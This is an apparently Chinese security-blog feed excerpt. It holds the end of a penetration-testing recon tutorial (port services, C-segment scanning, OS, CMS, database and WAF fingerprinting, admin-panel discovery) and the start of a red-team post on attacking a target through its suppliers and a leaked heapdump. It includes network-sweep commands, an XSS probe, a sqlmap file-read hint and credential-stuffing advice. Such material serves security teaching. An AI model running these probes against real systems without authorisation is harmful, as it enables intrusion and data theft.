<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-25526c36983f8ea3fcf9d75821953d0d6e47b974.png" title="image-20240318224306226" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-25526c36983f8ea3fcf9d75821953d0d6e47b974.png">
        
    </a></p>
<p>msrpc：Microsoft Remote Procedure Call微软远程过程调用，是 Windows 操作系统使用的一个协议。RPC 提供一种内部进程通讯机制，允许在一台电脑上运行的程序无缝的执行远程系统中的代码。</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-2675b1651130e44efc4c51ae9e448842a94f0e04.png" title="image-20240318224314679" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-2675b1651130e44efc4c51ae9e448842a94f0e04.png">
        
    </a></p>
<p>tcpwrapped：端口状态后经常标记tcpwrapped。tcpwrapped表示服务器运行 tcp_wrappers服务。tcp_wrappers是一种应用级防火墙。它可以根据预设，对SSH、Telnet、FTP服务的请求进行拦截，判断是否符合预设要求。如果符合，就会转发给对应的服务进程；否则，会中断连接请求。这说明tcp三次握手已经完成，但是并没有和目标主机建立连接。这表明，虽然目标主机的某项服务是可提供的，但你不在允许访问主机的名单列表中。当大量的端口服务都为tcpwrapped时，这说明可能是有负载均衡或者防火墙阻断了你的连接请求。</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-9a98d77153057b1aa90d637537378b2aa394d2d4.png" title="image-20240318224326847" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-9a98d77153057b1aa90d637537378b2aa394d2d4.png">
        
    </a></p>
<p>Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)：这是SQL Server中的SQL Reporting Service 服务使用的Microsoft HTTPAPI。</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-2816d3017e53b6d30098486fd83178454deb36d9.png" title="image-20240318224341790" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-2816d3017e53b6d30098486fd83178454deb36d9.png">
        
    </a></p>
<h3 id="32masscan" class="headerLink">
    <a href="#32masscan" class="header-mark"></a>3.2、masscan</h3><h3 id="33scanport" class="headerLink">
    <a href="#33scanport" class="header-mark"></a>3.3、ScanPort</h3><p>通过ping等方式获取网站IP，然后开始扫描</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-47b2aa77763ba20651442baa128c4c90b6cadad9.png" title="image-20240318224425359" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-47b2aa77763ba20651442baa128c4c90b6cadad9.png">
        
    </a></p>
<h3 id="34webrobot" class="headerLink">
    <a href="#34webrobot" class="header-mark"></a>3.4、webrobot</h3><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-091ea8900e9cc73306480b2b07be6c096b897eeb.png" title="image-20240318224438848" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-091ea8900e9cc73306480b2b07be6c096b897eeb.png">
        
    </a></p>
<h2 id="七旁站c段" class="headerLink">
    <a href="#%e4%b8%83%e6%97%81%e7%ab%99c%e6%ae%b5" class="header-mark"></a>七、旁站C段</h2><p>旁站：是和目标网站在同一台服务器上的其它网站</p>
<p>C端：是和服务器IP处在一个C段的其他服务器</p>
<p>对于防护比较强的主站，通常是很难挖掘到漏洞的，这时需要查看该站点的旁站，通过探测旁站的漏洞进行利用，从而拿下主站的权限。</p>
<p>当网站不存在旁站时，就需要进行C段探测（有些网站买断了相邻的几个IP做为分站，如果拿到分站的管理员敏感信息，如密码之类的，可以尝试对主站进行撞库），通过拿下C段中服务器进行ARP欺骗达到劫持域名的效果</p>
<p>对于红蓝对抗和护网，C段扫描比较有意义。对于单独网站的渗透测试，C段扫描意义不大。C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。</p>
<h2 id="1在线查询" class="headerLink">
    <a href="#1%e5%9c%a8%e7%ba%bf%e6%9f%a5%e8%af%a2" class="header-mark"></a>1、在线查询</h2><h3 id="11站点" class="headerLink">
    <a href="#11%e7%ab%99%e7%82%b9" class="header-mark"></a>1.1、站点</h3><p><a href="http://s.tool.chinaz.com/same" target="_blank" rel="noopener noreferrer">http://s.tool.chinaz.com/same</a></p>
<p><a href="https://dns.aizhan.com/" target="_blank" rel="noopener noreferrer">https://dns.aizhan.com/</a></p>
<p><a href="http://www.5kik.com/c/" target="_blank" rel="noopener noreferrer"><strong>http://www.5kik.com/c/</strong></a> <strong>？登不上</strong></p>
<p><a href="https://webscan.cc/" target="_blank" rel="noopener noreferrer">https://webscan.cc/</a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-e279f958bb4899a484b3ce373980e5ec67533039.png" title="image-20240318224505782" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-e279f958bb4899a484b3ce373980e5ec67533039.png">
        
    </a></p>
<h3 id="12google-hackingbing" class="headerLink">
    <a href="#12google-hackingbing" class="header-mark"></a>1.2、Google Hacking、Bing</h3><p>site:125.125.125.*</p>
<p><a href="http://cn.bing.com/search?q=ip:111.111.111.111" target="_blank" rel="noopener noreferrer">http://cn.bing.com/search?q=ip:111.111.111.111</a></p>
<h3 id="12网络空间搜索引擎" class="headerLink">
    <a href="#12%e7%bd%91%e7%bb%9c%e7%a9%ba%e9%97%b4%e6%90%9c%e7%b4%a2%e5%bc%95%e6%93%8e" class="header-mark"></a>1.2、网络空间搜索引擎</h3><p>fofa、shodan在线工具 语法:ip=&ldquo;106.15.141.18/24&rdquo;</p>
<h2 id="2探测工具" class="headerLink">
    <a href="#2%e6%8e%a2%e6%b5%8b%e5%b7%a5%e5%85%b7" class="header-mark"></a>2、探测工具</h2><h3 id="21k8cscan" class="headerLink">
    <a href="#21k8cscan" class="header-mark"></a>2.1、K8Cscan</h3><p><a href="https://github.com/k8gege/K8CScan" target="_blank" rel="noopener noreferrer">https://github.com/k8gege/K8CScan</a></p>
<h3 id="22nmapmasscan" class="headerLink">
    <a href="#22nmapmasscan" class="header-mark"></a>2.2、nmap、masscan</h3><p>nmap -p 22,21,443,8080-Pn 172.178.40.0/24</p>
<p>nmap -p 80,8080 &ndash;open ip/24</p>
<p>masscan -p 22,21,443,8080-Pn &ndash;rate=1000172.178.40.0/24</p>
<h3 id="23goby" class="headerLink">
    <a href="#23goby" class="header-mark"></a>2.3、goby</h3><h3 id="24御剑" class="headerLink">
    <a href="#24%e5%be%a1%e5%89%91" class="header-mark"></a>2.4、御剑</h3><h3 id="25北极熊扫描器" class="headerLink">
    <a href="#25%e5%8c%97%e6%9e%81%e7%86%8a%e6%89%ab%e6%8f%8f%e5%99%a8" class="header-mark"></a>2.5、北极熊扫描器</h3><h3 id="26通过手动ping" class="headerLink">
    <a href="#26%e9%80%9a%e8%bf%87%e6%89%8b%e5%8a%a8ping" class="header-mark"></a>2.6、通过手动ping</h3><h2 id="八整站分析" class="headerLink">
    <a href="#%e5%85%ab%e6%95%b4%e7%ab%99%e5%88%86%e6%9e%90" class="header-mark"></a>八、整站分析</h2><h2 id="1服务器类型" class="headerLink">
    <a href="#1%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%b1%bb%e5%9e%8b" class="header-mark"></a>1、服务器类型</h2><p>服务器信息包括服务器用的操作系统：Linux 还是 Windows 。现在企业网站服务器的操作系统有百分之九十以上用的是Linux操作系统。知道了服务器的操作系统之后，还需要知道操作系统使用的具体版本。因为很多低版本的操作系统都存在已知的漏洞。</p>
<p>判断是Linux还是Windows最简单就是通过ping来探测，Windows的TTL值都是一般是128，Linux则是64。所以大于100的肯定是Windows，而几十的肯定是Linux。但是，通过TTL值来判断服务器类型也不是百分之百准确的，有些windows服务器的TTL值也是几十，而且有的服务器禁止ping。</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-420bf81e98eff3ebf99c3175a0b7c670220a9e90.png" title="image-20240318224523272" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-420bf81e98eff3ebf99c3175a0b7c670220a9e90.png">
        
    </a></p>
<p>而判断目标网站服务器的具体的版本的话，可以采用 nmap 进行扫描， -O 和 -A 参数都能扫描出来</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-90fe369b6c4abbda7ef3ed41417487519c73dab8.png" title="image-20240318224542950" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-90fe369b6c4abbda7ef3ed41417487519c73dab8.png">
        
    </a></p>
<p>检测服务器平台、版本等，获取后可以制定漏洞挖掘方案（如IIS6.0存在解析漏洞等）。</p>
<p>将首页或者其他页面通过修改大小写辨别网站所使用的系统：</p>
<p>区分大小写（页面报错）&ndash;Linux</p>
<p>不区分大小写（页面正常）&ndash;Windows</p>
<h3 id="11-云悉web资产梳理" class="headerLink">
    <a href="#11-%e4%ba%91%e6%82%89web%e8%b5%84%e4%ba%a7%e6%a2%b3%e7%90%86" class="header-mark"></a>1.1、 云悉WEB资产梳理</h3><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-bf4e1adf631a7c74b4460c4c9d42184ff7829a35.png" title="image-20240318224635116" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-bf4e1adf631a7c74b4460c4c9d42184ff7829a35.png">
        
    </a></p>
<p><a href="http://www.yunsee.cn/" target="_blank" rel="noopener noreferrer">http://www.yunsee.cn/</a>，根据IIS版本判断Windows系统，系统对应版本通过搜索引擎查找。</p>
<p><strong>注：使用AppScan、WVS等扫描工具也可以判断。</strong></p>
<h2 id="2网站容器" class="headerLink">
    <a href="#2%e7%bd%91%e7%ab%99%e5%ae%b9%e5%99%a8" class="header-mark"></a>2、网站容器</h2><p>知道了这些信息之后，我们就需要知道网站用的web服务器是什么类型的：Apache、Nginx、Tomcat 还是 IIS。知道了web服务器是哪种类型后，我们还要探测web服务器具体的版本。比如Ngnix版本&lt;0.83会有解析漏洞 ，IIS6.0会有文件名解析漏洞、IIS7.0会有畸形解析漏洞等。不同的web服务器版本，存在着不同漏洞。</p>
<p>搭建网站的服务组件，例如：iis、Apache、nginx、tomcat等，通过网站容器判断存在的漏洞（如：Apache解析漏洞，nginx解析漏洞）。</p>
<h3 id="21火狐渗透测试浏览器" class="headerLink">
    <a href="#21%e7%81%ab%e7%8b%90%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95%e6%b5%8f%e8%a7%88%e5%99%a8" class="header-mark"></a>2.1、火狐渗透测试浏览器</h3><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-293739ff524f101f7df852e11e2aee860b32ae0d.png" title="image-20240318224652100" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-293739ff524f101f7df852e11e2aee860b32ae0d.png">
        
    </a></p>
<h3 id="22云悉web资产梳理" class="headerLink">
    <a href="#22%e4%ba%91%e6%82%89web%e8%b5%84%e4%ba%a7%e6%a2%b3%e7%90%86" class="header-mark"></a>2.2、云悉WEB资产梳理\</h3><h2 id="23脚本类型" class="headerLink">
    <a href="#23%e8%84%9a%e6%9c%ac%e7%b1%bb%e5%9e%8b" class="header-mark"></a>2.3、脚本类型</h2><p>我们需要知道网站用的脚本类型：php 、Jsp 、Asp 、Aspx 。</p>
<p>1）可以根据网站URL来判断</p>
<p>2）site:xxx filetype:php</p>
<p>3）可以根据Firefox的插件来判断</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-520a887bc15ded7d20cab8839955402aaec02bf5.png" title="image-20240318224729502" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-520a887bc15ded7d20cab8839955402aaec02bf5.png">
        
    </a></p>
<h3 id="31通过修改首页文件后缀查看页面响应判断" class="headerLink">
    <a href="#31%e9%80%9a%e8%bf%87%e4%bf%ae%e6%94%b9%e9%a6%96%e9%a1%b5%e6%96%87%e4%bb%b6%e5%90%8e%e7%bc%80%e6%9f%a5%e7%9c%8b%e9%a1%b5%e9%9d%a2%e5%93%8d%e5%ba%94%e5%88%a4%e6%96%ad" class="header-mark"></a>3.1、通过修改首页文件后缀查看页面响应判断</h3><p>通过修改index.xxx后缀内容（为ASP\ASPX\PHP\JSP），查看页面返回情况，页面返回正常便可以判断脚本类型，判断脚本类型是信息收集中最基本的工作之一。</p>
<h3 id="32通过搜索框查找相关文章辨别脚本类型" class="headerLink">
    <a href="#32%e9%80%9a%e8%bf%87%e6%90%9c%e7%b4%a2%e6%a1%86%e6%9f%a5%e6%89%be%e7%9b%b8%e5%85%b3%e6%96%87%e7%ab%a0%e8%be%a8%e5%88%ab%e8%84%9a%e6%9c%ac%e7%b1%bb%e5%9e%8b" class="header-mark"></a>3.2、通过搜索框查找相关文章辨别脚本类型</h3><p>在网站搜索框中输入任意字符，查询后，通过浏览器上的URL判断网站脚本类型。</p>
<h3 id="33通过爬虫工具爬取网站目录判断网站脚本类型" class="headerLink">
    <a href="#33%e9%80%9a%e8%bf%87%e7%88%ac%e8%99%ab%e5%b7%a5%e5%85%b7%e7%88%ac%e5%8f%96%e7%bd%91%e7%ab%99%e7%9b%ae%e5%bd%95%e5%88%a4%e6%96%ad%e7%bd%91%e7%ab%99%e8%84%9a%e6%9c%ac%e7%b1%bb%e5%9e%8b" class="header-mark"></a>3.3、通过爬虫工具爬取网站目录判断网站脚本类型</h3><p>Webrobot</p>
<h2 id="4cms类型" class="headerLink">
    <a href="#4cms%e7%b1%bb%e5%9e%8b" class="header-mark"></a>4、CMS类型</h2><p>在渗透测试中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。这是我们想要识别这些网站的指纹，我们就可以利用以下一些指纹识别在线网站。</p>
<p>识别dedecms、phpcms、emlog、帝国cms等，通过网站使用的CMS找取该CMS已经公布的漏洞进行利用，进一步渗透网站。</p>
<h3 id="41云悉指纹" class="headerLink">
    <a href="#41%e4%ba%91%e6%82%89%e6%8c%87%e7%ba%b9" class="header-mark"></a>4.1、云悉指纹</h3><p><a href="https://www.yunsee.cn/" target="_blank" rel="noopener noreferrer">https://www.yunsee.cn/</a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-ea7cd0bc83312b110b594e6b73b2c16dd49fdfd7.png" title="image-20240318224745687" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-ea7cd0bc83312b110b594e6b73b2c16dd49fdfd7.png">
        
    </a></p>
<h3 id="42threatscan" class="headerLink">
    <a href="#42threatscan" class="header-mark"></a>4.2、ThreatScan</h3><p><a href="https://scan.top15.cn/web/" target="_blank" rel="noopener noreferrer">https://scan.top15.cn/web/</a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-039eb6b513752749827e5cb1921b6209396d953d.png" title="image-20240318224806210" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-039eb6b513752749827e5cb1921b6209396d953d.png">
        
    </a></p>
<h3 id="43wappalyzer" class="headerLink">
    <a href="#43wappalyzer" class="header-mark"></a>4.3、wappalyzer</h3><p><a href="https://www.wappalyzer.com/" target="_blank" rel="noopener noreferrer">https://www.wappalyzer.com/</a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-edbf30fba7410f4669643ee406f70f7bd40a5840.png" title="image-20240318224818148" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-edbf30fba7410f4669643ee406f70f7bd40a5840.png">
        
    </a></p>
<h3 id="44whatweb" class="headerLink">
    <a href="#44whatweb" class="header-mark"></a>4.4、WhatWeb</h3><p><a href="https://whatweb.net/" target="_blank" rel="noopener noreferrer">http://whatweb.net/</a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-4917e9369baabdd749819b421843aa40762ffdd7.png" title="image-20240318224833360" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-4917e9369baabdd749819b421843aa40762ffdd7.png">
        
    </a></p>
<h3 id="45bugscaner" class="headerLink">
    <a href="#45bugscaner" class="header-mark"></a>4.5、BugScaner</h3><p><a href="http://whatweb.bugscaner.com/" target="_blank" rel="noopener noreferrer">http://whatweb.bugscaner.com/</a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-11f6d51361219f0834c539d6696031840bb53fd2.png" title="image-20240318224842513" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-11f6d51361219f0834c539d6696031840bb53fd2.png">
        
    </a></p>
<h3 id="46潮汐指纹" class="headerLink">
    <a href="#46%e6%bd%ae%e6%b1%90%e6%8c%87%e7%ba%b9" class="header-mark"></a>4.6、潮汐指纹</h3><p><a href="http://finger.tidesec.net/" target="_blank" rel="noopener noreferrer">http://finger.tidesec.net/</a></p>
<h2 id="5数据库类型" class="headerLink">
    <a href="#5%e6%95%b0%e6%8d%ae%e5%ba%93%e7%b1%bb%e5%9e%8b" class="header-mark"></a>5、数据库类型</h2><p>我们需要知道网站用的是哪种类型的数据库：Mysql、Oracle、SqlServer 还是 Access 。虽然这几种数据库的语法大体上相同，但是还是有区别的。所以我们还是要知道目标网站用的是哪种数据库，并且数据库是哪个版本的</p>
<p>各端口对应数据库类型：</p>
<p><strong>sql server&ndash;1433</strong></p>
<p><strong>oracle&ndash;1521</strong></p>
<p><strong>mysql&ndash;3306</strong></p>
<p><strong>postgresql&ndash;5432</strong></p>
<p><strong>access&ndash;默认不开放连接端口，数据库存储在FTP服务器上。</strong></p>
<p>几种数据库的区别：</p>
<p>Access 全名是Microsoft Office Access，是由微软发布的关联式数据库管理系统。小型数据库，当数据库达到100M左右的时候性能就会下降。数据库后缀名： .mdb 一般是asp的网页文件用access数据库</p>
<p>SQL Server是由Microsoft开发和推广的关系数据库管理系统（DBMS），是一个比较大型的数据库。端口号为1433。数据库后缀名 .mdf</p>
<p>MySQL 是一个关系型数据库管理系统，由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品。MySQL是最流行的关系型数据库管理系统，在 WEB 应用方面MySQL是最好的应用软件之一，MySQL数据库大部分是php的页面。默认端口是3306</p>
<p>Oracle又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。常用于比较大的网站。默认端口是1521</p>
<p>首先，成本上的差距，access是不要钱的，mysql也是开源的，sql server 是收费的一般也就几千，Oracle的费用则数万。其次，处理能力，access支持千以内的访问量，sql server支持几千到上万的访问，而Oracle则支持海量的访 问。再次，从数据库的规模来看，access是小型数据库，，mysql 是中小型数据库，sql server是中型数据库，Oracle是大型数据库。</p>
<p>通常情况：access&ndash;asp mysql&ndash;php oracle&ndash;jsp sqlserver&ndash;aspx</p>
<p>postgresql&ndash;php，常见搭配：</p>
<p>ASP 和 ASPX：ACCESS、SQL Server</p>
<p>PHP：MySQL、PostgreSQL</p>
<p>JSP：Oracle、MySQL</p>
<p>端口扫描判断数据库类型的方法较为准确，但是管理员也可能选择不开放外网数据库端口，开放内网的数据库端口，也有些管理员喜欢使用站库分离的方法或者使用WAF进行拦截端口扫描来防护站点，这样我们通过端口扫描判断数据库类型的方法便有些失效了。</p>
<h2 id="6waf" class="headerLink">
    <a href="#6waf" class="header-mark"></a>6、WAF</h2><p>判断安全狗、阿里云云盾、360网站卫士、护卫神等WEB应用程序防火墙，便于采取绕过WAF的办法。</p>
<p>Nmap探测WAF有两种脚本。</p>
<p>一种是http-waf-detect。</p>
<p>命令：nmap -p80,443 &ndash;script=http-waf-detect ip</p>
<p>一种是http-waf-fingerprint。</p>
<p>命令：nmap -p80,443 &ndash;script=http-waf-fingerprint ip</p>
<p>WAFW00F探测WAF</p>
<p>命令：wafw00f -a 域名</p>
<h3 id="61在线资产识别" class="headerLink">
    <a href="#61%e5%9c%a8%e7%ba%bf%e8%b5%84%e4%ba%a7%e8%af%86%e5%88%ab" class="header-mark"></a>6.1、在线资产识别</h3><p>云悉WEB资产梳理</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-bdbbbee08710a8f6d3d67b0a0ca820e3d6bdcf55.png" title="image-20240318224859531" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-bdbbbee08710a8f6d3d67b0a0ca820e3d6bdcf55.png">
        
    </a></p>
<h3 id="62手动检测是拦截页面或者http可识别字段" class="headerLink">
    <a href="#62%e6%89%8b%e5%8a%a8%e6%a3%80%e6%b5%8b%e6%98%af%e6%8b%a6%e6%88%aa%e9%a1%b5%e9%9d%a2%e6%88%96%e8%80%85http%e5%8f%af%e8%af%86%e5%88%ab%e5%ad%97%e6%ae%b5" class="header-mark"></a>6.2、手动检测是拦截页面或者HTTP可识别字段</h3><p>在搜索框中输入XSS弹窗代码<script>alert(&lsquo;XSS&rsquo;)</script> ，WAF拦截后判断WAF。</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-6f3ff949ae9133c2e3d419fefe8336d950b6e0f0.png" title="image-20240318224910129" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-6f3ff949ae9133c2e3d419fefe8336d950b6e0f0.png">
        
    </a></p>
<p>在可能存在的注入页面输入检测注入漏洞代码and 1=2，被WAF拦截后判断WAF。</p>
<h2 id="九后台查找" class="headerLink">
    <a href="#%e4%b9%9d%e5%90%8e%e5%8f%b0%e6%9f%a5%e6%89%be" class="header-mark"></a>九、后台查找</h2><p>·1弱口令默认后台：admin，admin/login.asp，manage，login.asp等等常见后台</p>
<p>·2查看网页的链接；一般来说，网站的主页有管理登陆类似的东西，大多数在网站底部版权处或鲁在冒页导肌程等，有些可能被管理员删掉</p>
<p>·3查看网站图片的属性有可能图片是上传大管理后台目录，但是是在前台显示</p>
<p>·4查看网站使用的管理系统，从而确定后台</p>
<p>·5用工具查找：wwwscan，intellitamper，御剑，进行爬虫、字典穷举扫描</p>
<p>·6robots.txt的帮助：robots.txt文件告诉蜘蛛程序在服务器上什么样的文件可以被查看</p>
<p>·7 GoogleHacker通过语法查找后台</p>
<p>·8查看网站使用的编辑器是否有默认后台，FCK、ewb等默认后台</p>
<p>·9短文件利用短文件漏洞进行猜解</p>
<p>·10、子域名有可能管理后台为admin.xxxxx.com、login.xxxxx.com</p>
<p>·11sqlmap-sql-shell load_file（&rsquo;d:/wwroot/index.php&rsquo;）；利用sql注入查看文件源码获取后台</p>
<p>·12社工、XSS利用社会工程系获取后台，利用存储型XSs获取后台</p>]]></description>
</item><item>
    <title>攻防实战外网突破</title>
    <link>https://www.bysec.cn/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/</link>
    <pubDate>Sun, 11 Feb 2024 18:24:29 &#43;0800</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/</guid>
    <description><![CDATA[<blockquote>
<p><em>转载自： <a href="https://forum.butian.net/share/2442" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/2442</a></em></p>
</blockquote>
<p>在经历了多年的攻防对抗之后，大量目标单位逐渐认识到安全防护的重要性。因此，他们已采取措施尽可能收敛资产暴露面，并加倍部署各种安全设备。但安全防护注重全面性，具有明显的短板&hellip;</p>
<h2 id="1供应链" class="headerLink">
    <a href="#1%e4%be%9b%e5%ba%94%e9%93%be" class="header-mark"></a>1、供应链</h2><p>在经历了多年的攻防对抗之后，大量目标单位逐渐认识到安全防护的重要性。因此，他们已采取措施尽可能收敛资产暴露面，并加倍部署各种安全设备。但安全防护注重全面性，具有明显的短板效应，一处出现短板，整个防护体系就可能瞬间崩溃。而目标单位的供应链往往是这些薄弱点的集中体现。这些供应链不仅暴露在外，而且由于复杂的关系，使得对它们的监控和管理变得更为困难。因此，攻击团队通常会选择从供应链着手，以一种迂回的方式绕过目标单位强大的防御体系，获得对目标单位的控制权限。</p>
<p>通过在搜索引擎上搜索&quot;系统名称&quot;目标单位</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-dc15fb381ad5ad415f72b673e089f8a5a86ba421.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-dc15fb381ad5ad415f72b673e089f8a5a86ba421.png">
        
    </a><br>
找到相关的供应商信息，通过对供应商进行攻击，获取目标单位的数据及权限。!</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-06c417df425049e840d6fc969931aea2c57abc86.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-06c417df425049e840d6fc969931aea2c57abc86.png">
        
    </a></p>
<h2 id="11heapdump泄露" class="headerLink">
    <a href="#11heapdump%e6%b3%84%e9%9c%b2" class="header-mark"></a>1.1、heapdump泄露</h2><p>通过对供应商资产进行渗透，发现某资产admin目录下存在heapdump文件泄露</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-a8d29cdeabe3761026a599de6f67ed8c5ecf498e.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-a8d29cdeabe3761026a599de6f67ed8c5ecf498e.png">
        
    </a></p>
<p>对于heapdump的利用方式这里就不太赘述，有许多文章对其原理和利用都进行了深入的研究，特定情况下还可以直接进行RCE，这里泄露了大量敏感信息，密码信息加入密码本</p>
